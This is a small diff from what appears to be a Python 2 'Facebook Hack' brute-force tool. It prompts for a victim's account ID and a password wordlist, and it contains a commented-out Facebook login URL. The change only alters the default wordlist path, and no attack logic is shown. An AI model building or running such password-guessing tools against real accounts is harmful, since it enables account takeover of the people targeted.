@@ -64,7 +64,7 @@ deadlikado()
 hack (GG+"/////////\033[90mFacebook  Hack\033[32;1m/////\033[90mDeadLikado\033[32;1m/////")
 email = str(raw_input(GL+"ID de la Victima \033[33;1m: "))
 
-passwordlist = str(raw_input(WW+"Lista de contraseñas\033[91m[ core/pass.txt ] \033[92;1m: "))
+passwordlist = str(raw_input(WW+"Lista de contraseñas\033[91m[ pass.txt ] \033[92;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
